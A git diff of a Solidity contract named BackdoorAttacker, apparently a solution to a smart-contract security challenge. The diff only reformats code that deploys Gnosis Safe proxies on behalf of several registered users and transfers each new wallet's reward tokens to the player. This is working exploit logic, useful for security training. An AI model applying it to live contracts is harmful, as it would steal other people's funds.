@@ -32,11 +32,15 @@ contract BackdoorAttacker {
     }
 
     function attack() public {
+
         bytes memory callData;
         address[] memory owners = new address[](1);
         address wallet;
+
         for (uint i = 0; i < 4; i++) {
+
             owners[0] = users[i];
+
             callData = abi.encodeCall(GnosisSafe.setup, (
                 owners, // _owners
                 1, // _threshold
@@ -47,8 +51,22 @@ contract BackdoorAttacker {
                 0, // payment
                 payable(player) // paymentReceiver
             ));
-            wallet = address(walletFactory.createProxyWithCallback(address(masterCopy), callData, 0, walletRegistry));
-            token.transferFrom(wallet, player, token.balanceOf(wallet));
+
+            wallet = address(walletFactory.createProxyWithCallback(
+                address(masterCopy), 
+                callData, 
+                0, 
+                walletRegistry
+            ));
+
+            token.transferFrom(
+                wallet, 
+                player, 
+                token.balanceOf(wallet)
+            );
+
         }
+        
     }
+
 }
